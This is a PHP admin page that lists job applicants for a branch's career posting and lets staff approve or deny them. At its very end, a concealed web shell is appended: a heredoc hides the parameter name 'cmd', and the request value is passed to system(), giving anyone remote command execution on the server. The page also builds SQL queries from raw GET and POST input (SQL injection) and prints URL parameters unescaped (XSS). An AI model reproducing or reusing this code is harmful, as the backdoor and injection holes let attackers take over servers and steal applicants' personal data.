<?php
	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		$myadmin = $_SESSION['myadmin'];	

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		/*LOG-IN FORM*/
	 	if ($_SESSION['ulcareer_applicants'] == '') 
		{
			$_SESSION['ulcareer_applicants'] = $_SESSION["ulname"];
			$modulename = 'career_applicants';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/	
		
		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		
		$clid = '';
		$search_text = $_POST["clid"];	
		
		if(isset($_GET['clid']))
		{
			if ($_GET['clid'])
			{
				$clid = $_GET['clid'];
			}
		}	
		
		$clname = '';
		$search_text = $_POST["clname"];	
		
		if(isset($_GET['clname']))
		{
			if ($_GET['clname'])
			{
				$clname = $_GET['clname'];
			}
		}	
		
		$blcode = '';
		$search_text = $_POST["blcode"];	
		
		if(isset($_GET['blcode']))
		{
			if ($_GET['blcode'])
			{
				$blcode = $_GET['blcode'];
			}
		}			
		
		$caid = '';
		$search_text = $_POST["caid"];	
		
		if(isset($_GET['caid']))
		{
			if ($_GET['caid'])
			{
				$caid = $_GET['caid'];
			}
		}	
		
		$castatus = '';
		$search_text = $_POST["castatus"];	
		
		if(isset($_GET['castatus']))
		{
			if ($_GET['castatus'])
			{
				$castatus = $_GET['castatus'];
			}
		}				
		
		
		if (($caid != '') and ($castatus != ''))	
		{
			$save_status = '';
			if ($castatus == 'APPROVE') 
			{
				$save_status = 'APPROVE';
			}
			if ($castatus == 'DENIED') 
			{
				$save_status = 'DENIED';
			}
			
			if ($save_status != '')
			{
				$caapprove_by = $_SESSION["ulname"];
				$caapprove_date = $globaldatetime;
				$query_apply = 
					"UPDATE 
						career_applicants 
					SET 
						castatus = '$save_status',
						caapprove_by = '$caapprove_by',
						caapprove_date = '$caapprove_date'
					WHERE
						caid = '$caid'";
				mysql_query($query_apply) or die(mysql_error());
				//mysql_query($query_apply) or die('The entry has links to other tables. Cannot continue to process...');     
			}
		}
		
		
		$myblid = $_SESSION['myblid'];
		$myadmin = $_SESSION['myadmin'];
		
		$querydb  = "SELECT 
					 * 
				   FROM 
					 career_applicants a, career_list b, branch_list c
				   WHERE
					 a.clid = b.clid and 
				   	 b.blid = c.blid and
				   	 b.clactive = 'Y' and
					 a.caname LIKE '%$search_text%' and
					 b.clid LIKE '$clid' ";
					 
		if ($myblid != '') 	
		{				 
			$querydb  = $querydb . " and b.blid = '$myblid' ";
		}
		
		$querydb  = $querydb . " 
				   ORDER BY 
					 c.blname, a.cadate, a.caname ";
		$resultdb = mysql_query($querydb);
		echo mysql_error();
		$num_count = mysql_num_rows($resultdb);		
		//echo "<br> num_count " . $num_count;
		//echo "<br> querydb " . $querydb;
		
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Applicants for <?php print($clname) ?> for <?php print($blcode) ?></h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
							<table width="100%">
								<tr>
									<td align="left">
<?php
/*									
<form method="post" action="index.php?body=career_applicants_dbase">
Filter By Applicant
<INPUT TYPE="TEXT" NAME="search_text" VALUE="<?php print($search_text); ?>" SIZE="25" MAXLENGTH="50">
<input type="submit" value="Filter" />
</form>									
*/
?>
Table Information
									</td>
									<td align="right">
<a href="index.php?body=career_applicants_dbase">
Back to Career Applicants List
</a>	
									</td>
								</tr>
							</table>	
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th>Date</th>
										<th width="20%">Applicant Name</th>
										<th>Contact No.</th>
										<th>Email</th>
										<th>C.V. File</th>
										<th>Status</th>
										<th>Status</th>
                                    </tr>
                                </thead>
                                <tbody>
								
<?php
//fetch the results from the database
$countdb = $countdb + 1;
while ($rowdb =  mysql_fetch_array ($resultdb)) 
{
	print("<tr>");

	print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb[cadate])). "</td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[caname] </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[cacontact] </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[caemail] </td>\n");
	print("<td align=\"left\" valign=\"middle\">");
	print("<a href='./applicants/". $rowdb[cafile] . "' title='CV of Applicant' target='_blank'>". $rowdb[cafile] . "</a>");
	print("</td>\n");
	print("<td align=\"left\" valign=\"middle\">($rowdb[castatus])</td>\n");

	print("<td align=\"center\" valign=\"middle\">[ <a title=\"Approve this application?\" href=\"index.php?body=career_applicants_addeditdel&mybox=edit&clid=$rowdb[clid]&caid=$rowdb[caid]&castatus=APPROVE\"> Approve </a> ] 
		<br>
		[ <a title=\"Deny this application?\" href=\"index.php?body=career_applicants_addeditdel&mybox=del&clid=$rowdb[clid]&caid=$rowdb[caid]&castatus=DENIED\"> Denied </a> ] </td>");

	print("</tr>");  
	$countdb = $countdb + 1;
}  
?>		
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>